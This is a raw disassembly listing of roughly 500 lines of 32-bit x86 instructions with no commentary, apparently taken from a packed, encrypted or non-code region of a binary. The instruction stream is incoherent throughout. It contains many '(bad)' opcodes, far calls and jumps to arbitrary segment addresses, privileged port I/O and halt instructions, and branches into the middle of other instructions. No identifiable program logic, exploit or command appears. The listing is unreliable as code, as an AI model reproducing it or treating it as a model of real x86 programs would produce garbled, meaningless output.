  411c4e:	sbb    al,BYTE PTR es:[edx]
  411c51:	jmp    0x8f29:0x89708a7c
  411c58:	cwde   
  411c59:	or     DWORD PTR [edi],ebp
  411c5b:	ror    DWORD PTR [edi+0x65],cl
  411c5e:	sti    
  411c5f:	fucomi st,st(1)
  411c61:	inc    edi
  411c62:	sbb    ch,bh
  411c64:	sbb    eax,0x40a2902f
  411c69:	dec    edx
  411c6a:	fisttp QWORD PTR [edx-0x8]
  411c6d:	xor    DWORD PTR [eax+ebp*4-0x7b],esi
  411c71:	call   0xc2c5:0x773ff8aa
  411c78:	mov    eax,ds:0x64a4f040
  411c7d:	xchg   BYTE PTR [edx+ebp*4],dl
  411c80:	pop    edi
  411c81:	sub    ah,BYTE PTR [eax-0x1f3a4e79]
  411c87:	pop    ds
  411c88:	outs   dx,DWORD PTR ds:[esi]
  411c89:	and    eax,0x17a4db09
  411c8e:	and    eax,edx
  411c90:	sbb    al,0xb1
  411c92:	push   edx
  411c93:	rol    DWORD PTR [ebp-0x64a80a7f],0xec
  411c9a:	push   ebx
  411c9b:	out    0xff,eax
  411c9d:	jle    0x411cf8
  411c9f:	enter  0x6961,0x9c
  411ca3:	mov    edx,0xf6d6cafc
  411ca8:	xchg   ebp,eax
  411ca9:	ffree  st(4)
  411cab:	in     al,dx
  411cac:	inc    esi
  411cad:	rcl    dl,cl
  411caf:	lahf   
  411cb0:	scas   eax,DWORD PTR es:[edi]
  411cb1:	(bad)  
  411cb2:	jmp    0xc441:0x56571603
  411cb9:	jmp    DWORD PTR [esp+ebp*2]
  411cbc:	outs   dx,BYTE PTR ds:[esi]
  411cbd:	jmp    0x7a4f1fdc
  411cc2:	test   ecx,0xc3bd2c95
  411cc8:	mul    DWORD PTR [edx]
  411cca:	push   0x144147ea
  411ccf:	popa   
  411cd0:	dec    esp
  411cd1:	adc    esp,DWORD PTR [esi-0x4b]
  411cd4:	aaa    
  411cd5:	int3   
  411cd6:	xor    dh,BYTE PTR [ecx]
  411cd8:	leave  
  411cd9:	aad    0x2d
  411cdb:	ins    DWORD PTR es:[edi],dx
  411cdc:	sbb    eax,0x7031dfc0
  411ce1:	xor    eax,DWORD PTR [esi+edi*2+0x66]
  411ce5:	dec    ebp
  411ce6:	inc    ebp
  411ce7:	mov    eax,0xfe9a0b0e
  411cec:	cmp    ecx,edx
  411cee:	mov    edi,?
  411cf0:	mov    bh,BYTE PTR [ebx]
  411cf2:	or     al,0x3f
  411cf4:	in     eax,dx
  411cf5:	push   es
  411cf6:	pop    esp
  411cf7:	ja     0x411d75
  411cf9:	push   eax
  411cfa:	scas   al,BYTE PTR es:[edi]
  411cfb:	adc    eax,0x18ddadf4
  411d00:	out    dx,al
  411d01:	fcmovu st,st(4)
  411d03:	pop    edi
  411d04:	push   edi
  411d05:	lahf   
  411d06:	aas    
  411d07:	mov    cl,0x5c
  411d09:	inc    esi
  411d0a:	cmp    cl,BYTE PTR [eax]
  411d0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d0d:	xchg   edi,eax
  411d0e:	call   0x57585835
  411d13:	pop    ebp
  411d14:	sbb    DWORD PTR [ecx-0x5b],0x61802720
  411d1b:	push   ss
  411d1c:	hlt    
  411d1d:	fdivr  st,st(4)
  411d1f:	xchg   ebx,eax
  411d20:	(bad)  
  411d21:	js     0x411d5d
  411d23:	arpl   WORD PTR [eax+0x6fba51cd],bp
  411d29:	sbb    cl,BYTE PTR [edx-0x76]
  411d2c:	cmp    al,BYTE PTR [edx-0x68]
  411d2f:	ficom  DWORD PTR [esi]
  411d31:	pop    edi
  411d32:	jno    0x411ce5
  411d34:	cmp    ah,BYTE PTR [ebx+edx*8+0x72405797]
  411d3b:	stos   DWORD PTR es:[edi],eax
  411d3c:	mov    bl,0xec
  411d3e:	into   
  411d3f:	fwait
  411d40:	push   es
  411d41:	pop    edi
  411d42:	cdq    
  411d43:	cmp    eax,esi
  411d45:	cli    
  411d46:	and    ecx,ecx
  411d48:	mov    ds,WORD PTR [edi+0x2f618a96]
  411d4e:	or     BYTE PTR [ebx],0xd0
  411d51:	adc    DWORD PTR [edi+eiz*8+0x4b692a3e],eax
  411d58:	out    dx,eax
  411d59:	arpl   di,ax
  411d5b:	aam    0x70
  411d5d:	lods   al,BYTE PTR cs:[esi]
  411d5f:	(bad)  
  411d61:	stos   DWORD PTR es:[edi],eax
  411d62:	aam    0x8f
  411d64:	fnstcw WORD PTR [edi+ebp*1-0x6e90731e]
  411d6b:	pop    ebp
  411d6c:	arpl   dx,bx
  411d6e:	mov    ds:0x5d755a77,eax
  411d73:	je     0x411d2b
  411d75:	inc    ebp
  411d76:	pop    es
  411d77:	or     dh,bh
  411d79:	outs   dx,BYTE PTR ds:[esi]
  411d7a:	ja     0x411d99
  411d7c:	int3   
  411d7d:	adc    al,0xd5
  411d7f:	cmp    BYTE PTR [ecx],dh
  411d81:	sub    eax,0xf1a3d577
  411d86:	fnstcw WORD PTR [si]
  411d89:	jl     0x411d40
  411d8b:	mov    eax,ds:0x7515c086
  411d90:	leave  
  411d91:	pop    ebx
  411d92:	mov    ebx,0x8d3cb705
  411d97:	push   ds
  411d98:	mov    eax,ebp
  411d9a:	lahf   
  411d9b:	bound  esi,QWORD PTR [eax+0x56af058d]
  411da1:	pop    esi
  411da2:	rol    BYTE PTR [ecx],1
  411da4:	addr16 enter 0xa89d,0xab
  411da9:	xchg   ebx,eax
  411daa:	pushf  
  411dab:	xor    DWORD PTR [ecx],ecx
  411dad:	loop   0x411d81
  411daf:	cmp    BYTE PTR [eax-0x6f],dl
  411db2:	dec    esp
  411db3:	jbe    0x411d39
  411db5:	add    DWORD PTR [ecx],ebx
  411db7:	outs   dx,DWORD PTR es:[esi]
  411db9:	dec    esp
  411dba:	cwde   
  411dbb:	add    eax,0x9dae5b58
  411dc0:	inc    esp
  411dc1:	adc    eax,0xc8202217
  411dc6:	mov    ds:0x9b3e2873,al
  411dcb:	bound  eax,QWORD PTR [eax]
  411dcd:	xchg   edi,eax
  411dce:	call   0x948186c3
  411dd3:	(bad)  
  411dd4:	pop    esp
  411dd5:	pop    ds
  411dd6:	or     ah,BYTE PTR [esi-0x6c]
  411dd9:	ins    DWORD PTR es:[edi],dx
  411dda:	std    
  411ddb:	(bad)  
  411ddc:	fnstcw WORD PTR [ebp-0x7283ec90]
  411de2:	pop    ss
  411de3:	jecxz  0x411da7
  411de5:	(bad)  
  411de6:	xchg   edx,eax
  411de7:	mov    eax,0xa290c0f1
  411dec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ded:	adc    eax,0x8fc9590d
  411df2:	mov    cl,0xa4
  411df4:	aad    0x64
  411df6:	fist   WORD PTR ss:[eax+ebp*2-0x1]
  411dfb:	mov    esi,ds
  411dfd:	push   cs
  411dfe:	lods   eax,DWORD PTR ds:[esi]
  411dff:	jmp    0x2c481337
  411e04:	mov    ax,ds:0x33e07b69
  411e0a:	lock pop ebx
  411e0c:	arpl   WORD PTR [edi-0x5f],si
  411e0f:	jle    0x411dd5
  411e11:	mov    ecx,ecx
  411e13:	int3   
  411e14:	inc    ecx
  411e15:	xchg   edi,eax
  411e16:	es jo  0x411db9
  411e19:	gs cli 
  411e1b:	add    eax,0x57a795f3
  411e20:	das    
  411e21:	push   ebx
  411e22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e23:	rol    BYTE PTR [ebp+eiz*8+0x56041169],0x8
  411e2b:	inc    ecx
  411e2c:	call   0x5c7a4569
  411e31:	ins    DWORD PTR es:[edi],dx
  411e32:	ds test al,0x64
  411e35:	xchg   ecx,eax
  411e36:	inc    eax
  411e38:	cmp    eax,0x9e5c539e
  411e3d:	fld    DWORD PTR [edx+0x5d830862]
  411e43:	push   ss
  411e44:	icebp  
  411e45:	lea    esp,[edi+0x70]
  411e48:	fimul  WORD PTR [esi]
  411e4a:	fistp  QWORD PTR [eax+0x60188c06]
  411e50:	sbb    DWORD PTR [eax],edi
  411e52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e53:	scas   al,BYTE PTR es:[edi]
  411e54:	out    dx,al
  411e55:	(bad)  
  411e57:	pop    ds
  411e58:	jo     0x411eaa
  411e5a:	cwde   
  411e5b:	xchg   edx,eax
  411e5c:	lds    esi,FWORD PTR ds:0x7ca999c9
  411e62:	jge    0x411e91
  411e64:	retf   0x1f8b
  411e67:	inc    esi
  411e68:	pop    ebx
  411e69:	jmp    0xd8829a62
  411e6e:	bound  ebx,QWORD PTR [ecx]
  411e70:	sbb    ecx,DWORD PTR [ebp-0x20]
  411e73:	add    DWORD PTR gs:[edi],ebp
  411e76:	pushf  
  411e77:	sbb    DWORD PTR [edi+eiz*8+0x60],0xc02e59ef
  411e7f:	lods   al,BYTE PTR ds:[esi]
  411e80:	(bad)  
  411e81:	or     al,0x90
  411e83:	fistp  QWORD PTR [edi+esi*2-0x6c]
  411e87:	dec    esp
  411e88:	fdiv   DWORD PTR [esp+ecx*4+0x51]
  411e8c:	xor    DWORD PTR [ebx+0x58cf90e8],ebp
  411e92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e93:	dec    edi
  411e94:	inc    edx
  411e95:	pop    edi
  411e96:	neg    BYTE PTR [ebx-0x1a]
  411e99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e9a:	jmp    FWORD PTR [ecx]
  411e9c:	fst    QWORD PTR [edx]
  411e9e:	call   0x25cd36be
  411ea3:	ja     0x411ee2
  411ea5:	mov    esp,0xb3bf340c
  411eaa:	jl     0x411ed8
  411eac:	xor    eax,0xda70f4b0
  411eb1:	xchg   esi,eax
  411eb2:	lds    edi,FWORD PTR [ebx]
  411eb4:	lds    edi,FWORD PTR [edi+0x2b9c5b8a]
  411eba:	imul   edx,ebp,0x3a913632
  411ec0:	xchg   ebx,eax
  411ec1:	ret    0x125d
  411ec4:	fwait
  411ec5:	dec    bl
  411ec7:	xchg   esp,eax
  411ec8:	dec    eax
  411ec9:	add    ch,BYTE PTR [eax-0x5bd2ba83]
  411ecf:	dec    eax
  411ed0:	or     edx,DWORD PTR [eax-0x3b906185]
  411ed6:	idiv   DWORD PTR [ebx+0x7ae740f5]
  411edc:	xor    al,0x5c
  411ede:	hlt    
  411edf:	mov    esi,0x9055304d
  411ee4:	mov    al,0x1a
  411ee6:	inc    eax
  411ee7:	call   0xbff5:0x4c887830
  411eee:	nop
  411eef:	in     eax,dx
  411ef0:	cdq    
  411ef1:	adc    ch,BYTE PTR [esp+edx*4]
  411ef4:	inc    ebx
  411ef5:	stos   DWORD PTR es:[edi],eax
  411ef6:	js     0x411f26
  411ef8:	lods   eax,DWORD PTR ds:[esi]
  411ef9:	add    DWORD PTR [eax+0x36cfe12a],ebx
  411eff:	lods   eax,DWORD PTR ds:[esi]
  411f00:	test   DWORD PTR [eax-0x2a],esp
  411f03:	imul   BYTE PTR [ebx]
  411f05:	adc    DWORD PTR [eax+0x6a],0x1bd110cc
  411f0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f0d:	popa   
  411f0e:	ins    DWORD PTR es:[edi],dx
  411f0f:	lea    ebp,[edx]
  411f11:	rcr    esi,0x24
  411f14:	and    eax,0xa217059c
  411f19:	out    dx,eax
  411f1a:	imul   ebx
  411f1c:	dec    ebx
  411f1d:	out    dx,eax
  411f1e:	aam    0x13
  411f20:	outs   dx,DWORD PTR ds:[esi]
  411f21:	test   eax,0xd611e465
  411f26:	mov    BYTE PTR [ebx-0x1b],bh
  411f29:	lea    ebx,[esi]
  411f2b:	dec    ecx
  411f2c:	or     cl,BYTE PTR [esi]
  411f2e:	(bad)  
  411f2f:	sub    DWORD PTR [edi],ecx
  411f31:	xor    ch,bl
  411f33:	push   ss
  411f34:	ret    
  411f35:	mov    ds:0xa9301afc,al
  411f3a:	xor    ebp,DWORD PTR [ebp-0x13eef327]
  411f40:	and    esi,DWORD PTR [esp+eax*8+0x66474c35]
  411f47:	mov    ds:0x8b1fc8eb,eax
  411f4c:	xchg   ebx,eax
  411f4d:	in     al,dx
  411f4e:	out    dx,eax
  411f4f:	or     bh,BYTE PTR [eax+0x2401d2ba]
  411f55:	sub    al,0x20
  411f57:	inc    esp
  411f58:	xchg   BYTE PTR [ebx+ecx*8+0x29858ad0],cl
  411f5f:	dec    ebx
  411f60:	in     al,0x76
  411f62:	and    bl,ah
  411f64:	push   ds
  411f65:	push   esp
  411f66:	inc    ebp
  411f67:	lods   eax,DWORD PTR ds:[esi]
  411f68:	imul   ebp,ebx,0xffffff97
  411f6b:	sub    eax,0x54a50c8d
  411f70:	lods   eax,DWORD PTR ds:[esi]
  411f71:	(bad)  [edi-0x5d]
  411f74:	push   esp
  411f75:	pop    ss
  411f76:	inc    esp
  411f77:	shl    DWORD PTR [edx-0x6bb57289],0x95
  411f7e:	data16 lods al,BYTE PTR ds:[esi]
  411f80:	fucompp 
  411f82:	inc    ecx
  411f83:	ins    DWORD PTR es:[edi],dx
  411f84:	xchg   ebp,eax
  411f85:	nop
  411f86:	gs stos BYTE PTR es:[edi],al
  411f88:	jmp    0xb509f7a7
  411f8d:	int3   
  411f8e:	pusha  
  411f8f:	icebp  
  411f90:	mov    BYTE PTR [ecx+0x7d],0x31
  411f94:	mov    gs,WORD PTR [esi]
  411f96:	nop
  411f97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f98:	inc    eax
  411f99:	adc    DWORD PTR [esi+edi*4-0x10],edi
  411f9d:	icebp  
  411f9e:	xchg   esp,eax
  411f9f:	push   es
  411fa0:	lock adc eax,0x9c23acd5
  411fa6:	and    edx,DWORD PTR [ebx+0x2e38fe70]
  411fac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fad:	loopne 0x411f95
  411faf:	mov    ebx,0x248fe3e7
  411fb4:	push   edx
  411fb5:	jo     0x411fc9
  411fb7:	xchg   ebp,eax
  411fb8:	mov    edx,0x64f6239e
  411fbd:	scas   al,BYTE PTR es:[edi]
  411fbe:	sub    BYTE PTR [eax-0x3b],cl
  411fc1:	xchg   esi,eax
  411fc2:	jp     0x412021
  411fc4:	(bad)  
  411fc5:	sub    ebp,edx
  411fc7:	pop    edx
  411fc8:	imul   ebx,esp,0x71
  411fcb:	xchg   esi,eax
  411fcc:	lds    esi,FWORD PTR [edx-0x44f01ee6]
  411fd2:	xchg   ebp,eax
  411fd3:	mov    ds:0x1d679b9d,eax
  411fd8:	mov    DWORD PTR [edx],edi
  411fda:	jb     0x411ffe
  411fdc:	xor    ebx,DWORD PTR [ecx+0x67]
  411fdf:	add    ebp,DWORD PTR [esi+esi*1]
  411fe2:	pop    eax
  411fe3:	lods   al,BYTE PTR ds:[esi]
  411fe4:	adc    DWORD PTR [ebp+edi*1-0x11b6811],edi
  411feb:	jp     0x411fe8
  411fed:	fcmovne st,st(2)
  411fef:	jno    0x412022
  411ff1:	jb     0x41203b
  411ff3:	fsub   DWORD PTR ss:[ebx+0x8faa1e3]
  411ffa:	int    0x53
  411ffc:	and    DWORD PTR [edi-0x7f],edx
  411fff:	scas   eax,DWORD PTR es:[edi]
  412000:	in     al,dx
  412001:	inc    esi
  412002:	add    DWORD PTR [edx+0x104fe0d6],0xb64ebfda
  41200c:	lahf   
  41200d:	(bad)  
  41200e:	mov    ebp,0x63092d31
  412013:	(bad)  
  412014:	push   ds
  412015:	lahf   
  412016:	cmp    eax,0x1b887c51
  41201b:	pop    ebx
  41201c:	pusha  
  41201d:	and    al,0xc5
  41201f:	sub    eax,ecx
  412021:	xchg   esp,eax
  412022:	mov    edx,0xdc88566a
  412027:	push   es
  412028:	lahf   
  412029:	popa   
  41202a:	mov    dl,0x37
  41202c:	pushf  
  41202d:	pushf  
  41202e:	xchg   ecx,eax
  41202f:	(bad)  
  412030:	in     eax,0xb8
  412032:	call   0xa87f:0xa4e2fdd6
  412039:	arpl   WORD PTR [edx],bp
  41203b:	cli    
  41203c:	sub    al,0x3c
  41203e:	mov    al,ds:0x9e0eb53a
  412043:	or     ah,al
  412045:	inc    eax
  412046:	jae    0x411ff3
  412048:	test   eax,0x930f4d88
  41204d:	mov    ds:0x6e3f793a,eax
  412052:	imul   esp,DWORD PTR [ebp+0x155b5ba4],0x4fe65189
  41205c:	jmp    0x41205b
  41205e:	imul   eax,DWORD PTR [ecx+0x32db060],0x6f91da57
  412068:	iret   
  412069:	cdq    
  41206a:	mov    dh,BYTE PTR [edi]
  41206c:	xlat   BYTE PTR ds:[ebx]
  41206d:	outs   dx,DWORD PTR ds:[esi]
  41206e:	mov    ebp,0x4afa17a1
  412073:	jae    0x4120a5
  412075:	js     0x4120f3
  412077:	jo     0x412000
  412079:	sar    DWORD PTR [esi-0x26],0x45
  41207d:	(bad)  
  41207e:	sahf   
  41207f:	outs   dx,BYTE PTR ds:[esi]
  412080:	ins    DWORD PTR es:[edi],dx
  412081:	cmovnp esp,DWORD PTR [edx+0x4bc1c267]
  412088:	jp     0x412023
  41208a:	bound  edx,QWORD PTR [edi+0x1624c436]
  412090:	sbb    al,0x89
  412092:	xor    DWORD PTR [eax-0x4916fe3],ebx
  412098:	(bad)  
  412099:	fs xor al,ah
  41209c:	pop    ss
  41209d:	outs   dx,BYTE PTR ds:[esi]
  41209e:	inc    edi
  41209f:	cmp    al,0xdb
  4120a1:	ss out 0xec,eax
  4120a4:	lods   eax,DWORD PTR ds:[esi]
  4120a5:	sub    eax,0xb01f84b9
  4120aa:	xor    ch,cl
  4120ac:	inc    esp
  4120ad:	mov    esi,0xc186a7ef
  4120b2:	sbb    al,0x5d
  4120b4:	(bad)  
  4120b6:	les    ebp,FWORD PTR [edi-0x1b]
  4120b9:	loop   0x41209e
  4120bb:	jae    0x4120af
  4120bd:	imul   ecx,edi,0xffffffd1
  4120c0:	inc    eax
  4120c1:	jae    0x41211c
  4120c3:	scas   al,BYTE PTR es:[edi]
  4120c4:	lods   al,BYTE PTR ds:[esi]
  4120c5:	and    bh,BYTE PTR [edi]
  4120c7:	fbstp  TBYTE PTR [edx+0x3a]
  4120ca:	arpl   bp,di
  4120cc:	repz (bad) 
  4120cf:	add    ah,BYTE PTR [eax+0x668ed0aa]
  4120d5:	mov    dl,0x1e
  4120d7:	pop    ebx
  4120d8:	rol    BYTE PTR [edx],0xda
  4120db:	jge    0x412108
  4120dd:	jmp    0x5a6cef38
  4120e2:	jae    0x412072
  4120e4:	sbb    dh,BYTE PTR [edx+0x75abd168]
  4120ea:	test   BYTE PTR es:[edx+0x6abf3153],al
  4120f1:	icebp  
  4120f2:	imul   DWORD PTR ds:0x7c310b80
  4120f8:	sub    ebx,DWORD PTR [esi+esi*1-0xb25fb96]
  4120ff:	add    ch,ch
  412101:	cld    
  412102:	mov    WORD PTR [esi+edi*2+0x57],gs
  412106:	push   edi
  412107:	xchg   ecx,eax
  412108:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412109:	fistp  DWORD PTR [ecx+0x26]
  41210c:	inc    esi
  41210d:	sub    dh,BYTE PTR [esi+ecx*1+0x43]
  412111:	cmp    BYTE PTR [ebp+0x5d],0xf3
  412115:	jge    0x4120c6
  412117:	js     0x412114
  412119:	stc    
  41211a:	cmp    esp,DWORD PTR [eax+0x48068820]
  412120:	out    0x36,al
  412122:	fstp   TBYTE PTR [ebx+0x23e4da77]
  412128:	adc    DWORD PTR [ecx-0x5b53ed50],ecx
  41212e:	mov    ebx,0xaa060d6a
  412133:	xor    al,0xc1
  412135:	add    DWORD PTR ds:[ebx],ebp
  412138:	(bad)  
  412139:	dec    edx
  41213a:	pusha  
  41213b:	or     eax,DWORD PTR [ebx+0x31]
  41213e:	mov    cl,0x81
  412140:	push   ecx
  412141:	mov    esi,0x2f852c67
  412146:	repz pop ebp
  412148:	add    edx,DWORD PTR [ecx-0xe]
  41214b:	sbb    bh,ah
  41214d:	or     eax,0x7c4fa931
  412152:	jne    0x412134
  412154:	int3   
  412155:	add    eax,0x65ab12e2
  41215a:	lock xchg esp,eax
  41215c:	and    DWORD PTR [edi-0x28],esi
  41215f:	xor    al,0x80
  412161:	test   BYTE PTR [eax+0x11],0xf7
  412165:	sub    eax,0xe54809db
  41216a:	stos   BYTE PTR es:[edi],al
  41216b:	addr16 cmp al,0x4f
  41216e:	sbb    ax,0xbaf
  412172:	push   edi
  412173:	pop    esi
  412174:	cs add eax,0x95fe6f83
  41217a:	push   ss
  41217b:	loop   0x412149
  41217d:	jnp    0x412177
  41217f:	mov    esi,edx
  412181:	xlat   BYTE PTR ds:[ebx]
  412182:	inc    eax
  412183:	xchg   ecx,eax
  412184:	xor    edi,DWORD PTR [ebp+0x75]
  412187:	ret    0xec3f
  41218a:	adc    edi,DWORD PTR [edi-0x7c]
  41218d:	sub    bl,BYTE PTR [esi+0xa9a96e5]
  412193:	adc    al,0xaf
  412195:	mov    edi,0xbeb0bd9
  41219a:	pusha  
  41219b:	adc    al,0xd9
  41219d:	sar    DWORD PTR [ebp+ebx*2+0x41],1
  4121a1:	sahf   
  4121a2:	adc    BYTE PTR [esi],dl
  4121a4:	out    0x3,al
  4121a6:	cmc    
  4121a7:	dec    esp
  4121a8:	sbb    bl,bh
  4121aa:	pusha  
  4121ab:	xchg   DWORD PTR [ecx+0x6e5db4e3],ebp
  4121b1:	jp     0x412217
  4121b3:	and    DWORD PTR [edi],ebp
  4121b5:	mov    DWORD PTR [esi-0x1cf2dd07],edx
  4121bb:	loopne 0x4121ea
  4121bd:	scas   al,BYTE PTR es:[edi]
  4121be:	mov    edi,0x69d35ee8
  4121c3:	mov    ebx,0x48152de3
  4121c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121c9:	adc    al,0xff
  4121cb:	repnz cld 
  4121cd:	rcl    dh,cl
  4121cf:	sar    DWORD PTR [edx],cl
  4121d1:	std    
  4121d2:	xchg   ecx,eax
  4121d3:	aaa    
  4121d4:	xor    BYTE PTR [ecx],bh
  4121d6:	int3   
  4121d7:	xor    dl,BYTE PTR [ebp-0x38]
  4121da:	mov    ch,0xee
  4121dc:	arpl   WORD PTR [esi-0x55],bp
  4121df:	inc    esi
  4121e0:	xor    ebx,DWORD PTR [ecx+0x69]
  4121e3:	aaa    
  4121e4:	aas    
  4121e5:	loopne 0x4121cb
  4121e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121e8:	ror    DWORD PTR [ebx-0x11],1
  4121eb:	push   es
  4121ec:	mov    DWORD PTR [esp],eax
  4121ef:	or     al,0x75
  4121f1:	icebp  
  4121f2:	and    DWORD PTR [edi],0x55877be7
  4121f8:	mov    bl,0xbc
  4121fa:	cmp    cl,BYTE PTR [edx]
  4121fc:	xchg   esi,eax
  4121fd:	jae    0x41220b
  4121ff:	mov    edi,0xc70dba7c
  412204:	fbld   TBYTE PTR gs:[edx*2-0x7e1c27f8]
  41220c:	cwde   
  41220d:	stos   DWORD PTR es:[edi],eax
  41220e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41220f:	or     BYTE PTR [edx+0x1a7f3311],0xfb
  412216:	or     BYTE PTR [esi-0x44572497],bl
  41221c:	mov    ds:0x824a9c2d,al
  412221:	cli    
  412222:	call   0x46d4:0xc55f8dd5
  412229:	or     cl,BYTE PTR [edx]
  41222b:	ss inc ebp
  41222d:	(bad)  
  41222e:	sbb    DWORD PTR [edx+0x474a54fc],ebp
  412234:	adc    BYTE PTR [ebx],ah
  412236:	cmp    DWORD PTR [edx],ecx
  412238:	add    eax,0xabfb1715
  41223d:	xor    dl,BYTE PTR [esi]
  41223f:	aaa    
  412240:	mov    WORD PTR [eax-0x49],?
  412243:	lock cmps BYTE PTR ds:[si],BYTE PTR es:[di]
  412246:	out    0x7c,al
  412248:	and    edi,DWORD PTR [ecx+ebp*1+0x61a819b]
  41224f:	jl     0x412261
  412251:	neg    BYTE PTR [ebx+0x33]
  412254:	add    edi,edi
  412256:	(bad)  
  412257:	lock or al,0xbb
  41225a:	sub    eax,ecx
  41225c:	xchg   ebx,eax
  41225d:	mov    edi,0xb748b1a4
  412262:	fsubr  QWORD PTR [edx-0x44ba8872]
  412268:	mov    edx,0xae0a865f
  41226d:	adc    al,0x78
  41226f:	pusha  
  412270:	mov    BYTE PTR [esi],0xe4
  412273:	jo     0x412296
  412275:	ds test eax,0xe4418bfb
  41227b:	test   al,0x42
  41227d:	or     esi,ecx
  41227f:	bound  edx,QWORD PTR [edi]
  412281:	adc    bl,BYTE PTR [ebx]
  412283:	jecxz  0x4122c2
  412285:	cli    
  412286:	mov    esp,0x7c2b91d9
  41228b:	bound  edi,QWORD PTR [ecx+0x4880b07]
  412291:	mov    WORD PTR [eax+0x62c08ad9],gs
  412297:	pop    ds
  412298:	into   
  412299:	outs   dx,DWORD PTR ds:[esi]
  41229a:	pushf  
  41229b:	ss nop
  41229d:	adc    DWORD PTR [ebx],esp
  41229f:	rol    BYTE PTR [ebp-0x1dd41161],cl
  4122a5:	lods   eax,DWORD PTR ds:[esi]
  4122a6:	pop    ss
  4122a7:	and    al,dh
  4122a9:	sub    al,bl
  4122ab:	dec    esi
  4122ac:	ret    0x372f
  4122af:	int3   
  4122b0:	jmp    0x41231b
  4122b2:	ins    DWORD PTR es:[edi],dx
  4122b3:	mov    ds:0xf7e35600,al
  4122b8:	test   al,0x4
  4122ba:	dec    ecx
  4122bb:	fsubr  DWORD PTR [ebp-0x38f0de24]
  4122c1:	xlat   BYTE PTR ds:[ebx]
  4122c2:	push   esp
  4122c3:	fbld   TBYTE PTR [eax-0x5d1a9582]
  4122c9:	xchg   esp,eax
  4122ca:	push   ebx
  4122cb:	dec    eax
  4122cc:	mov    ah,0x8
  4122ce:	cmc    
  4122cf:	(bad)  
  4122d0:	mov    eax,0xe90cb93c
  4122d5:	add    esi,DWORD PTR [eax+ebx*1]
  4122d8:	in     eax,0x70
  4122da:	rcr    BYTE PTR [ecx-0x23],cl
  4122dd:	stos   BYTE PTR es:[edi],al
  4122de:	in     al,0x2d
  4122e0:	(bad)  [eax+0x1c352f3b]
  4122e6:	data16 outs dx,BYTE PTR ds:[esi]
  4122e8:	push   0xffffffdc
  4122ea:	mov    ecx,0x7b8bcc04
  4122ef:	lods   al,BYTE PTR ds:[esi]
  4122f0:	cmp    ah,BYTE PTR [ebp+0x5f]
  4122f3:	jne    0x41236d
  4122f5:	inc    edx
  4122f6:	lock inc ebp
  4122f8:	mov    bh,0xa3
  4122fa:	outs   dx,BYTE PTR ds:[esi]
  4122fb:	mov    ds:0xb4778ca0,al
  412300:	scas   eax,DWORD PTR es:[edi]
  412301:	pusha  
  412302:	icebp  
  412303:	bound  esp,QWORD PTR [edx-0x7f]
  412306:	sub    BYTE PTR [edx+edi*2+0x6a],0xa
  41230b:	in     al,dx
  41230c:	add    BYTE PTR [edx+0x2ca2f3d9],ch
  412312:	fld    QWORD PTR [edi+0xc]
  412315:	mov    ch,0x7c
  412317:	in     eax,0x4
  412319:	sbb    edi,edi
  41231b:	and    eax,0xbfb88066
  412320:	into   
  412321:	push   0x91f407b7
  412326:	popa   
  412327:	hlt    
  412328:	cdq    
  412329:	add    eax,0xd2488926
  41232e:	aas    
  41232f:	push   ds
  412330:	call   0xea4ac629
  412335:	js     0x412360
  412337:	or     al,0x31
  412339:	arpl   WORD PTR [ebx+0x14],di
  41233c:	aaa    
  41233d:	stos   BYTE PTR es:[edi],al
  41233e:	iret   
  41233f:	bnd ja 0x412320
  412342:	clc    
  412343:	ret    0xc639
  412346:	cmp    DWORD PTR [ebx-0x2c],edx
  412349:	iret   
  41234a:	xor    al,0x65
  41234c:	mov    bl,0xea
  41234e:	neg    DWORD PTR [ebp+0x24f80867]
  412354:	repz xchg ch,dh
  412357:	fmulp  st(7),st
  412359:	jnp    0x4122ed
  41235b:	imul   esi,DWORD PTR [ebx],0x8349b4f6
  412361:	imul   eax,DWORD PTR [ebx+0x2b],0xe
  412365:	sbb    BYTE PTR [edi+0x115b38d9],bl
  41236b:	jns    0x4123bc
  41236d:	scas   al,BYTE PTR es:[edi]
  41236e:	mov    bh,BYTE PTR [esi-0x6d9674f1]
  412374:	dec    ecx
  412375:	aad    0x6e
  412377:	sbb    eax,0x270ec3b0
  41237c:	or     al,0x6a
  41237e:	adc    cl,BYTE PTR [edx-0x7de98005]
  412384:	push   esp
  412385:	lds    ebp,FWORD PTR [edi+eax*1-0xc47e8ed]
  41238c:	mov    dl,0xb4
  41238e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41238f:	fwait
  412390:	pushf  
  412391:	jge    0x41231f
  412393:	xchg   DWORD PTR [edi],ecx
  412395:	lahf   
  412396:	mov    dl,0xe3
  412398:	(bad)  
  412399:	into   
  41239a:	xchg   edi,edi
  41239c:	push   ecx
  41239d:	mov    ebp,0xba85e435
  4123a2:	pusha  
  4123a3:	push   esi
  4123a4:	retf   0xae4c
  4123a7:	adc    eax,eax
  4123a9:	mov    al,ds:0xff65715e
  4123ae:	shl    DWORD PTR [esi],1
  4123b0:	cli    
  4123b1:	push   edi
  4123b2:	ret    0xb4aa
  4123b5:	pop    es
  4123b6:	in     al,0x9f
  4123b8:	out    dx,eax
  4123b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123ba:	dec    ebp
  4123bb:	std    
  4123bc:	loop   0x4123d3
  4123be:	mov    dl,0x82
  4123c0:	pop    edx
  4123c1:	in     al,dx
  4123c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123c3:	jl     0x4123a8
  4123c5:	lahf   
  4123c6:	mov    esp,0x57fb5b13
  4123cb:	or     eax,0xd12ca96
  4123d0:	scas   eax,DWORD PTR es:[edi]
  4123d1:	call   0x2dfc:0xc1e5ef2c
